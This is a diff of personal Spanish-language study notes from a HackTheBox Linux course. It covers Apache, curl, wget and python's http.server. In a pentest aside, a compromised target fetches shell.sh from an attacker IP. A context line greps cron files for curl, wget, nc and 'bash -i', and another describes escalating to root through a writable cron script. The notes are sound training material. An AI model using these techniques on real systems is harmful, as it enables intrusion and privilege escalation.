@@ -427,6 +427,35 @@ grep -rE "curl|wget|nc|bash -i" /etc/cron*   # ¿algo descarga y ejecuta?
 ```
 - En máquinas de HTB es un patrón clásico: un cron corre como root un script que cualquiera puede escribir luego editas el script, esperas el minuto y bum eres root.
 
+### Trabajando con servicios web
+
+**Lo que ya sabía (repaso):**
+- Apache/nginx/IIS = web servers; Apache es modular (mod_ssl = cifrado, mod_proxy = redirección/traffic controller, mod_headers, mod_rewrite) — mismo concepto que mis configs de nginx como reverse proxy
+- Apache sirve contenido estático y dinámico (PHP, Perl, Ruby, Python...)
+- Puerto HTTP por defecto: 80; verificar con `curl -I http://localhost` → headers `200 OK`
+- `curl <url>` → la página va a **stdout** (ya lo viví a fondo en la saga del 34)
+- `wget <url>` → **descarga y guarda** el archivo localmente
+- `python3 -m http.server` → web server instantáneo (¡literalmente mi alias `serve`! escucha en 0.0.0.0:8000 y loguea cada request)
+
+**Lo que NO sabía / detalles nuevos:**
+- `apache2ctl` existe como comando de control; el binario `apache2` a secas NO se usa directo (las variables de entorno de la config default lo requieren). Para arrancar: `systemctl start apache2` (ya lo manejo)
+- Cambiar el puerto de Apache: editar **`/etc/apache2/ports.conf`** → `Listen 8080` → restart. (En el Pwnbox el 80 está ocupado por otro servicio — por eso 8080)
+- La distinción formal **curl vs wget**: curl = transferir/inspeccionar (stdout, testeo); wget = descargar (guarda a disco, "download manager"). En HTB casi siempre curl para mirar, wget/curl para traer cosas
+- `python3 -m http.server` **también es un logger**: cada GET queda impreso en tu terminal con IP, path y código de respuesta
+
+** El ángulo pentest (el verdadero valor de esta sección):**
+> `python3 -m http.server` es LA herramienta de transferencia de archivos post-explotación:
+> 1. En tu máquina: `serve 8000` dentro de la carpeta con tus payloads
+> 2. En el target comprometido: `wget http://10.10.14.X:8000/shell.sh` o `curl -o shell.sh http://...`
+> 3. Tu terminal te muestra EN VIVO cuándo el target jaló el archivo (el log)
+>
+> Y curl es tu "browser de terminal" para inspeccionar apps web antes de atacar: ver código fuente, headers (`-I`), enviar datos (`-d`), custom User-Agent (`-A`) — este último ya lo viví a mano con netcat en el lab de FTP.
+
+**Conexión con mi historial:** el serve() que hice como función hace dos días es exactamente el tool que esta sección presenta. Y el User-Agent custom del lab FTP es `curl -A "Server Administrator"` automatizado. Todo conecta.
+
+### Backup y restauracion
+
+
 
 ## Lo que viví en la sesión (no está en el módulo, pero importa)
 
